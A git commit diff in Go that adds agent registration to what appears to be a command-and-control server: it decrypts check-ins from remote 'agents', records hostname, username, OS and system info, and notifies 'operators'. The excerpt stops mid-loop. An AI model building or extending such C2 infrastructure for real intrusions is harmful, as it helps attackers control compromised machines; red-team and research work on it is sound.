565242ee8c7f1ae0a14307a3c0abd9a848fd4724
1rhino2 <noreply@github.com>
2025-10-17 20:18:00 -0400

    agent reg

--- server/server.go
+++ server/server.go
@@ -78,3 +78,73 @@ func (s *Server) handleAgent(w http.ResponseWriter, r *http.Request) {
 
 	var agent *Agent
 	defer func() {
+		conn.Close()
+		if agent != nil {
+			s.mu.Lock()
+			delete(s.agents, agent.ID)
+			s.mu.Unlock()
+			s.broadcastToOperators(Message{
+				Type:    "agent_disconnected",
+				AgentID: agent.ID,
+			})
+			log.Printf("agent disconnected: %s", agent.ID)
+		}
+	}()
+
+	_, msg, err := conn.ReadMessage()
+	if err != nil {
+		log.Printf("read initial msg failed: %v", err)
+		return
+	}
+
+	decrypted, err := s.crypto.Decrypt(string(msg))
+	if err != nil {
+		log.Printf("decrypt failed: %v", err)
+		return
+	}
+
+	var checkin map[string]interface{}
+	if err := json.Unmarshal(decrypted, &checkin); err != nil {
+		log.Printf("unmarshal failed: %v", err)
+		return
+	}
+
+	agent = &Agent{
+		ID:        checkin["id"].(string),
+		Hostname:  checkin["hostname"].(string),
+		Username:  checkin["username"].(string),
+		OS:        checkin["os"].(string),
+		IP:        r.RemoteAddr,
+		LastSeen:  time.Now(),
+		FirstSeen: time.Now(),
+		Conn:      conn,
+	}
+
+	if arch, ok := checkin["arch"].(string); ok {
+		agent.Arch = arch
+	}
+
+	if sysinfo, ok := checkin["sysinfo"].(map[string]interface{}); ok {
+		agent.SysInfo = make(map[string]string)
+		for k, v := range sysinfo {
+			if str, ok := v.(string); ok {
+				agent.SysInfo[k] = str
+			}
+		}
+	}
+
+	s.mu.Lock()
+	s.agents[agent.ID] = agent
+	s.mu.Unlock()
+
+	log.Printf("agent connected: %s (%s@%s) [%s/%s]",
+		agent.ID[:16], agent.Username, agent.Hostname, agent.OS, agent.Arch)
+
+	s.broadcastToOperators(Message{
+		Type:    "agent_connected",
+		AgentID: agent.ID,
+		Data:    agent.info(),
+	})
+
+	for {
+		_, msg, err := conn.ReadMessage()
